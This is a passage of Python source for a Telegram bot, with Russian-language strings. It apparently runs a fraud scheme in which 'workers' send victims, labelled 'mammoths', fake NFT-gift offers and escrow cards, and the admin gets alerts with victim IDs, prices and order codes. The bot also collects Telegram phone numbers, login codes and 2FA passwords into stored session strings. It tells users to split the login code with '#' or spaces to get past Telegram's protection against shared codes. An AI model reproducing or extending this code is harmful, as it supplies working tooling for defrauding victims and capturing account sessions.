            o = OFFERS.get(offer_id)
            if o:
                card_text = make_offer_card(o)
                kb = make_offer_kb(offer_id, o.get("lang", DEFAULT_LANG))
                try:
                    await bot.edit_message_text(
                        inline_message_id=chosen.inline_message_id,
                        text=card_text,
                        parse_mode="HTML",
                        reply_markup=kb
                    )
                except TelegramBadRequest as e:
                    err = str(e).lower()
                    if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
                        clean_txt = clean_custom_emoji(card_text)
                        await bot.edit_message_text(
                            inline_message_id=chosen.inline_message_id,
                            text=clean_txt,
                            parse_mode="HTML",
                            reply_markup=kb
                        )
        except Exception as e:
            print(f"[CHOSEN] Error: {e}", flush=True)

# ═══════════════════════════════════════════════════════
# 🔘 ОБРАБОТКА КНОПОК
# ═══════════════════════════════════════════════════════

async def edit_offer_message(call: types.CallbackQuery, o: dict, new_text: str, keep_kb: bool = False, kb=None):
    parse_mode = "HTML"
    try:
        if call.inline_message_id:
            await bot.edit_message_text(
                inline_message_id=call.inline_message_id,
                text=new_text,
                parse_mode=parse_mode,
                reply_markup=kb if keep_kb else None,
            )
            return True
        elif call.message:
            await bot.edit_message_text(
                chat_id=call.message.chat.id,
                message_id=call.message.message_id,
                text=new_text,
                parse_mode=parse_mode,
                reply_markup=kb if keep_kb else None,
            )
            return True
    except TelegramBadRequest as e:
        err = str(e).lower()
        if "custom" in err or "entity" in err or "emoji" in err or "parse" in err:
            clean_txt = clean_custom_emoji(new_text)
            try:
                if call.inline_message_id:
                    await bot.edit_message_text(
                        inline_message_id=call.inline_message_id,
                        text=clean_txt,
                        parse_mode=parse_mode,
                        reply_markup=kb if keep_kb else None,
                    )
                elif call.message:
                    await bot.edit_message_text(
                        chat_id=call.message.chat.id,
                        message_id=call.message.message_id,
                        text=clean_txt,
                        parse_mode=parse_mode,
                        reply_markup=kb if keep_kb else None,
                    )
                return True
            except Exception as e2:
                print(f"[EDIT] fallback error: {e2}", flush=True)
        else:
            if "not found" in err:
                return False
            print(f"[EDIT] error: {e}", flush=True)
    except Exception as e:
        print(f"[EDIT] error: {e}", flush=True)
    return False

@dp.callback_query()
async def universal_callback(call: types.CallbackQuery):
    data = call.data or ""
    uid = call.from_user.id
    current_lang = get_lang(uid)

    if data == "open:lang":
        rows = [
            [InlineKeyboardButton(text=f"{'✅ ' if code == current_lang else ''}{name}", callback_data=f"setlang:{code}")]
            for code, name in LANGS.items()
        ]
        rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
        await call.message.edit_text(t(current_lang, "choose_lang"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
        return

    if data == "open:currency":
        curr = get_currency(uid)
        rows = [
            [InlineKeyboardButton(text=f"{'✅ ' if code == curr else ''}{get_currency_label(code, current_lang, plain=True)}", callback_data=f"setcurrency:{code}")]
            for code in CURRENCIES.keys()
        ]
        rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
        await call.message.edit_text(t(current_lang, "choose_currency"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
        return

    if data == "open:main":
        text = t(
            current_lang, "start_msg",
            uid=uid,
            worker_username=get_worker_username(uid),
            lang=LANGS.get(current_lang, current_lang),
            currency=get_currency_label(get_currency(uid), current_lang, plain=True),
            session_status=session_status(uid),
            business_status=business_status(uid),
        )
        await call.message.edit_text(text, reply_markup=make_worker_main_kb(uid))
        return

    if data.startswith("setlang:"):
        new_lang = data.split(":")[1]
        if new_lang in LANGS:
            WORKER_LANGS[uid] = new_lang
            save_data()
            await call.answer(t(new_lang, "lang_set", lang=LANGS[new_lang]))
            rows = [
                [InlineKeyboardButton(text=f"{'✅ ' if code == new_lang else ''}{name}", callback_data=f"setlang:{code}")]
                for code, name in LANGS.items()
            ]
            rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
            try:
                await call.message.edit_text(t(new_lang, "choose_lang"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
            except Exception:
                pass
        return

    if data.startswith("setcurrency:"):
        new_cur = data.split(":")[1]
        if new_cur in CURRENCIES:
            WORKER_CURRENCIES[uid] = new_cur
            save_data()
            label_plain = get_currency_label(new_cur, current_lang, plain=True)
            await call.answer(t(current_lang, "currency_set", currency=label_plain))
            rows = [
                [InlineKeyboardButton(text=f"{'✅ ' if code == new_cur else ''}{get_currency_label(code, current_lang, plain=True)}", callback_data=f"setcurrency:{code}")]
                for code in CURRENCIES.keys()
            ]
            rows.append([InlineKeyboardButton(text="◀️ Назад", callback_data="open:main")])
            try:
                await call.message.edit_text(t(current_lang, "choose_currency"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))
            except Exception:
                pass
        return

    if data.startswith("accept:"):
        _, _, raw_id = data.partition(":")
        if not raw_id.isdigit():
            return
        offer_id = int(raw_id)
        o = OFFERS.get(offer_id)
        if not o:
            await call.answer("Оффер не найден или истёк", show_alert=True)
            return

        offer_lang = o.get("lang", DEFAULT_LANG)
        worker_id = o["worker_id"]
        worker_uname = o.get("worker_username") or get_worker_username(worker_id)
        cur_label = get_currency_label(o.get("currency", DEFAULT_CURRENCY), offer_lang, plain=True)

        alert_text = t(offer_lang, "alert_accepted", gift_name=o["gift_name"], worker_username=worker_uname)
        await call.answer(alert_text, show_alert=True)

        if o.get("status") == "pending":
            o["status"] = "accepted"
            o["accepted_at"] = datetime.now(timezone.utc)
            order = o.get("order_code") or gen_order_code()
            o["order_code"] = order
            save_data()

            accepted_text = t(
                offer_lang,
                "accepted_body",
                price=o["price"],
                currency=cur_label,
                gift_name=o["gift_name"],
                order=order,
                worker_username=worker_uname
            )
            await edit_offer_message(call, o, accepted_text)

            mammoth_uname = f"@{call.from_user.username.lstrip('@')}" if call.from_user.username else o.get("mammoth_username", "—")
            await send_message_safe(
                ADMIN_ID,
                f"✅ <b>Оффер #{offer_id} ПРИНЯТ!</b>\n\n"
                f"👤 Мамонт: <code>{call.from_user.id}</code> ({mammoth_uname})\n"
                f"💼 Воркер: <code>{worker_id}</code> (@{worker_uname})\n"
                f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
                f"🔗 Ссылка: {o['gift_link']}\n"
                f"💰 Сумма: <b>{o['price']} {cur_label}</b>\n"
                f"📦 Заказ: <code>#{order}</code>\n"
                f"🛠 Режим: <b>{o.get('delivery', '?')}</b>"
            )
        return

    if data.startswith("reject:"):
        _, _, raw_id = data.partition(":")
        if not raw_id.isdigit():
            return
        offer_id = int(raw_id)
        o = OFFERS.get(offer_id)
        if not o:
            await call.answer("Оффер не найден", show_alert=True)
            return

        offer_lang = o.get("lang", DEFAULT_LANG)
        await call.answer(t(offer_lang, "alert_rejected"), show_alert=True)
        rejected_text = t(offer_lang, "rejected_body")
        await edit_offer_message(call, o, rejected_text)

        mammoth_uname = f"@{call.from_user.username.lstrip('@')}" if call.from_user.username else o.get("mammoth_username", "—")
        worker_uname = o.get("worker_username") or get_worker_username(o["worker_id"])
        await send_message_safe(
            ADMIN_ID,
            f"❌ <b>Оффер #{offer_id} отклонён</b>\n\n"
            f"👤 Мамонт: <code>{call.from_user.id}</code> ({mammoth_uname})\n"
            f"💼 Воркер: <code>{o['worker_id']}</code> (@{worker_uname})\n"
            f"🎁 Подарок: <b>{o['gift_name']}</b>\n"
            f"🔗 Ссылка: {o['gift_link']}\n"
            f"🛠 Режим: <b>{o.get('delivery', '?')}</b>"
        )
        OFFERS.pop(offer_id, None)
        save_data()

# ═══════════════════════════════════════════════════════
# 📱 АВТОРИЗАЦИЯ СЕССИИ ЧЕРЕЗ БОТА
# ═══════════════════════════════════════════════════════

class AuthSessionStates(StatesGroup):
    waiting_for_phone = State()
    waiting_for_code = State()
    waiting_for_2fa = State()

@dp.callback_query(F.data == "session:connect")
async def start_session_connect(call: types.CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    if not is_worker(uid):
        return

    await state.set_state(AuthSessionStates.waiting_for_phone)
    kb = InlineKeyboardMarkup(inline_keyboard=[
        [InlineKeyboardButton(text="❌ Отмена", callback_data="session:cancel")]
    ])
    await call.message.edit_text(
        "📱 <b>Подключение аккаунта</b>\n\n"
        "Отправь номер телефона от Telegram в международном формате:\n\n"
        "<i>Пример:</i> <code>+79991234567</code>",
        reply_markup=kb
    )

@dp.callback_query(F.data == "session:cancel")
async def cancel_session_connect(call: types.CallbackQuery, state: FSMContext):
    uid = call.from_user.id
    if uid in LOGIN_FLOW:
        try:
            await LOGIN_FLOW[uid]["client"].disconnect()
        except Exception:
            pass
        LOGIN_FLOW.pop(uid, None)

    await state.clear()
    await call.answer("Отменено")
    await call.message.edit_text("❌ Подключение отменено.", reply_markup=make_worker_main_kb(uid))

@dp.callback_query(F.data == "session:disconnect")
async def disconnect_session_handler(call: types.CallbackQuery):
    uid = call.from_user.id
    if uid in ACTIVE_CLIENTS:
        try:
            await ACTIVE_CLIENTS[uid].disconnect()
        except Exception:
            pass
        ACTIVE_CLIENTS.pop(uid, None)

    WORKER_SESSIONS.pop(uid, None)
    save_data()
    await call.answer("Сессия отключена", show_alert=True)
    await call.message.edit_reply_markup(reply_markup=make_worker_main_kb(uid))

@dp.message(AuthSessionStates.waiting_for_phone)
async def process_phone(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    phone = re.sub(r"[^\d+]", "", message.text.strip())
    if not phone or len(phone) < 8:
        await message.answer("❌ Введи номер в формате <code>+79991234567</code>:")
        return

    status_msg = await message.answer("⏳ Запрашиваю код подтверждения...")
    client = TelegramClient(StringSession(), API_ID, API_HASH, catch_up=False)
    await client.connect()

    try:
        sent_code = await client.send_code_request(phone)
        LOGIN_FLOW[uid] = {
            "client": client,
            "phone": phone,
            "phone_code_hash": sent_code.phone_code_hash,
        }
        await state.set_state(AuthSessionStates.waiting_for_code)
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="session:cancel")]
        ])
        await status_msg.edit_text(
            "📩 <b>Код подтверждения отправлен в твой Telegram!</b>\n\n"
            "⚠️ Чтобы Telegram не удалил код, отправь его <b>через решётку или пробелы</b>.\n\n"
            "<i>Примеры:</i>\n"
            "• <code>1#2#3#4#5</code>\n"
            "• <code>1 2 3 4 5</code>",
            reply_markup=kb
        )
    except Exception as e:
        await client.disconnect()
        await status_msg.edit_text(f"❌ Ошибка отправки кода: <code>{e}</code>")
        await state.clear()

@dp.message(AuthSessionStates.waiting_for_code)
async def process_code(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    flow = LOGIN_FLOW.get(uid)
    if not flow:
        await message.answer("Сессия устарела. Нажми /start.")
        await state.clear()
        return

    clean_code = re.sub(r"\D", "", message.text.strip())
    if len(clean_code) < 4:
        await message.answer("❌ Введи код через решётку (например: <code>1#2#3#4#5</code>):")
        return

    client: TelegramClient = flow["client"]
    phone = flow["phone"]
    phone_code_hash = flow["phone_code_hash"]

    try:
        await client.sign_in(phone=phone, code=clean_code, phone_code_hash=phone_code_hash)
        session_str = client.session.save()
        WORKER_SESSIONS[uid] = session_str

        me = await client.get_entity('me')
        if getattr(me, "username", None):
            WORKER_USERNAMES[uid] = me.username.lstrip("@")
        elif message.from_user.username:
            WORKER_USERNAMES[uid] = message.from_user.username.lstrip("@")

        save_data()
        await state.clear()
        LOGIN_FLOW.pop(uid, None)
        await register_worker_client(uid, session_str)

        await message.answer(
            f"🎉 <b>Аккаунт успешно подключен!</b>\n\n"
            f"👤 Тег получателя: <b>@{get_worker_username(uid)}</b>\n\n"
            f"<b>Сессия:</b>\n<code>.оффер https://t.me/nft/SnakeBox-30973 1000</code>\n\n"
            f"<b>Бизнес:</b>\n<code>оффер https://t.me/nft/SnakeBox-30973 1000</code>",
            reply_markup=make_worker_main_kb(uid)
        )
    except SessionPasswordNeededError:
        await state.set_state(AuthSessionStates.waiting_for_2fa)
        kb = InlineKeyboardMarkup(inline_keyboard=[
            [InlineKeyboardButton(text="❌ Отмена", callback_data="session:cancel")]
        ])
        await message.answer("🔒 <b>На аккаунте стоит 2FA (Облачный пароль).</b>\n\nОтправь пароль сюда:", reply_markup=kb)
    except PhoneCodeInvalidError:
        await message.answer("❌ Неверный код! Отправь через решётку (<code>1#2#3#4#5</code>):")
    except PhoneCodeExpiredError:
        await message.answer("❌ Время действия кода истекло. Начни заново через /start.")
        await client.disconnect()
        LOGIN_FLOW.pop(uid, None)
        await state.clear()
    except Exception as e:
        await message.answer(f"❌ Ошибка: <code>{e}</code>")
        await client.disconnect()
        LOGIN_FLOW.pop(uid, None)
        await state.clear()

@dp.message(AuthSessionStates.waiting_for_2fa)
async def process_2fa(message: types.Message, state: FSMContext):
    uid = message.from_user.id
    flow = LOGIN_FLOW.get(uid)
    if not flow:
        await message.answer("Сессия устарела. Нажми /start.")
        await state.clear()
        return

    client: TelegramClient = flow["client"]
    password = message.text.strip()

    try:
        await client.sign_in(password=password)
        session_str = client.session.save()
        WORKER_SESSIONS[uid] = session_str

        me = await client.get_entity('me')
        if getattr(me, "username", None):
            WORKER_USERNAMES[uid] = me.username.lstrip("@")
        elif message.from_user.username:
            WORKER_USERNAMES[uid] = message.from_user.username.lstrip("@")

        save_data()
        await state.clear()
        LOGIN_FLOW.pop(uid, None)
        await register_worker_client(uid, session_str)

        await message.answer(
            f"🎉 <b>Аккаунт подключен!</b>\n\n"
            f"👤 Тег получателя: <b>@{get_worker_username(uid)}</b>\n\n"
            f"<b>Сессия:</b>\n<code>.оффер https://t.me/nft/SnakeBox-30973 1000</code>\n\n"
            f"<b>Бизнес:</b>\n<code>оффер https://t.me/nft/SnakeBox-30973 1000</code>",
            reply_markup=make_worker_main_kb(uid)
        )
    except PasswordHashInvalidError:
        await message.answer("❌ Неверный пароль 2FA. Попробуй ещё раз:")
    except Exception as e:
        await message.answer(f"❌ Ошибка 2FA: <code>{e}</code>")
        await client.disconnect()
        LOGIN_FLOW.pop(uid, None)
        await state.clear()

# ═══════════════════════════════════════════════════════
# 📋 /START И КОМАНДЫ
# ═══════════════════════════════════════════════════════

@dp.message(CommandStart())
async def cmd_start(message: types.Message):
    uid = message.from_user.id

    if is_worker(uid):
        if message.from_user.username:
            WORKER_USERNAMES[uid] = message.from_user.username.lstrip("@")
            save_data()

        lang = get_lang(uid)
        cur = get_currency(uid)
        curr_label = get_currency_label(cur, lang, plain=True)

        text = t(
            lang,
            "start_msg",
            uid=uid,
            worker_username=get_worker_username(uid),
            lang=LANGS.get(lang, lang),
            currency=curr_label,
            session_status=session_status(uid),
            business_status=business_status(uid),
        )
        await send_message_safe(uid, text, reply_markup=make_worker_main_kb(uid))
        return

    target_offer = None
    for o in sorted(OFFERS.values(), key=lambda x: str(x.get("created_at")), reverse=True):
        if o.get("mammoth_id") == uid:
            target_offer = o
            break

    if target_offer:
        offer_lang = target_offer.get("lang", DEFAULT_LANG)
        cur_label = get_currency_label(target_offer.get("currency", DEFAULT_CURRENCY), offer_lang, plain=True)
        worker_uname = target_offer.get("worker_username") or get_worker_username(target_offer["worker_id"])

        if not target_offer.get("order_code"):
            target_offer["order_code"] = gen_order_code()
            save_data()

        info_text = t(
            offer_lang,
            "accepted_body",
            price=target_offer["price"],
            currency=cur_label,
            gift_name=target_offer["gift_name"],
            order=target_offer["order_code"],
            worker_username=worker_uname
        )
        await send_message_safe(uid, info_text)
        return

    await send_message_safe(uid, t(DEFAULT_LANG, "escrow_welcome"))

@dp.message(Command("id", "myid"))
async def cmd_id(message: types.Message):
    await message.answer(f"Твой Telegram ID: <code>{message.from_user.id}</code>")

@dp.message(Command("setusername", "username"))
async def cmd_set_username(message: types.Message):
    uid = message.from_user.id
    if not is_worker(uid):
        return
    args = (message.text or "").split()
    if len(args) < 2:
        current = get_worker_username(uid)
        await message.answer(
            f"👤 Твой юзернейм в офферах: <b>@{current}</b>\n\n"
            f"Для смены отправь:\n<code>/setusername @твой_юзернейм</code>"
        )
        return
    new_uname = args[1].lstrip("@").strip()
    WORKER_USERNAMES[uid] = new_uname
    save_data()
    await message.answer(f"✅ Юзернейм для офферов установлен: <b>@{new_uname}</b>")

@dp.message(Command("lang"))
async def cmd_lang(message: types.Message):
    uid = message.from_user.id
    if not is_worker(uid):
        return
    current = get_lang(uid)
    rows = [
        [InlineKeyboardButton(text=f"{'✅ ' if code == current else ''}{name}", callback_data=f"setlang:{code}")]
        for code, name in LANGS.items()
    ]
    await send_message_safe(uid, t(current, "choose_lang"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@dp.message(Command("currency"))
async def cmd_currency(message: types.Message):
    uid = message.from_user.id
    if not is_worker(uid):
        return
    current = get_currency(uid)
    lang = get_lang(uid)
    rows = [
        [InlineKeyboardButton(text=f"{'✅ ' if code == current else ''}{get_currency_label(code, lang, plain=True)}", callback_data=f"setcurrency:{code}")]
        for code in CURRENCIES.keys()
    ]
    await send_message_safe(uid, t(lang, "choose_currency"), reply_markup=InlineKeyboardMarkup(inline_keyboard=rows))

@dp.message(Command("grant"))
async def cmd_grant(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = (message.text or "").split()
    if len(args) < 2 or not args[1].lstrip("-").isdigit():
        await send_message_safe(message.chat.id, "Использование: <code>/grant 123456789</code>")
        return
    uid = int(args[1])
    WORKERS.add(uid)
    save_data()
    await update_worker_commands(uid)
    await send_message_safe(message.chat.id, f"✅ Воркер <code>{uid}</code> добавлен.")
    try:
        await send_message_safe(uid, "🎉 <b>Вам выдан доступ воркера!</b>\nНажмите /start")
    except Exception:
        pass

@dp.message(Command("revoke"))
async def cmd_revoke(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    args = (message.text or "").split()
    if len(args) < 2 or not args[1].lstrip("-").isdigit():
        await send_message_safe(message.chat.id, "Использование: <code>/revoke 123456789</code>")
        return
    uid = int(args[1])
    WORKERS.discard(uid)
    WORKER_LANGS.pop(uid, None)
    WORKER_CURRENCIES.pop(uid, None)
    WORKER_USERNAMES.pop(uid, None)
    if uid in ACTIVE_CLIENTS:
        try:
            await ACTIVE_CLIENTS[uid].disconnect()
        except Exception:
            pass
        ACTIVE_CLIENTS.pop(uid, None)
    WORKER_SESSIONS.pop(uid, None)
    WORKER_BUSINESS.pop(uid, None)
    save_data()
    try:
        await bot.delete_my_commands(scope=BotCommandScopeChat(chat_id=uid))
    except Exception:
        pass
    await send_message_safe(message.chat.id, f"✅ Воркер <code>{uid}</code> удалён.")

@dp.message(Command("workers"))
async def cmd_workers(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    lines = ["👥 <b>Список воркеров:</b>\n"]
    for wid in sorted(WORKERS):
        lang = get_lang(wid)
        cur = get_currency(wid)
        uname = get_worker_username(wid)
        sess = "✅ Сессия" if wid in WORKER_SESSIONS else "❌ Сессия"
        biz = "✅ Бизнес" if WORKER_BUSINESS.get(wid, {}).get("enabled") else "❌ Бизнес"
        lines.append(f"• <code>{wid}</code> (@{uname}) — {LANGS.get(lang, lang)} — {get_currency_label(cur, lang, plain=True)} [{sess} | {biz}]")
    await send_message_safe(message.chat.id, "\n".join(lines))

@dp.message(Command("offers"))
async def cmd_offers(message: types.Message):
    if message.from_user.id != ADMIN_ID:
        return
    if not OFFERS:
        await send_message_safe(message.chat.id, "📋 Активных офферов нет.")
        return
    lines = [f"📋 <b>Активные офферы ({len(OFFERS)}):</b>\n"]
    now = datetime.now(timezone.utc)
    for oid, o in OFFERS.items():
        created = o.get("created_at")
        minutes = int((now - created).total_seconds() // 60) if isinstance(created, datetime) else "?"
        wuname = o.get("worker_username") or get_worker_username(o["worker_id"])
        lines.append(
            f"#{oid} [{o.get('status')}/{o.get('delivery', '?')}] — {o['gift_name']} — <b>{o['price']} {get_currency_label(o.get('currency'), o.get('lang'), plain=True)}</b>\n"
            f"   Воркер: <code>{o['worker_id']}</code> (@{wuname})\n"
            f"   Мамонт: <code>{o['mammoth_id']}</code> | Возраст: {minutes} мин.\n"
            f"   Ссылка: {o.get('gift_link', '—')}"
        )
    await send_message_safe(message.chat.id, "\n".join(lines))

# ═══════════════════════════════════════════════════════
# 🚀 ЗАПУСК
# ═══════════════════════════════════════════════════════

async def main():
    print("=" * 60)
    print("Запуск Multi-Worker Bot (Session + Business + Inline)...")
    print(f"Админ: {ADMIN_ID} | Бот: @{BOT_USERNAME}")
    print("=" * 60)

    for wid, session_str in list(WORKER_SESSIONS.items()):
        asyncio.create_task(register_worker_client(wid, session_str))

    await bot.delete_webhook(drop_pending_updates=True)

    await bot.set_my_commands(
        [BotCommand(command="start", description="Начать / Start")],
        scope=BotCommandScopeDefault()
    )
    for wid in WORKERS:
        await update_worker_commands(wid)

    print("✅ Бот готов к работе.")
    await dp.start_polling(
        bot,
        allowed_updates=[
            "message",
            "callback_query",
            "inline_query",
            "chosen_inline_result",
            "business_connection",
            "business_message",
        ],
    )

if __name__ == "__main__":
    asyncio.run(main())
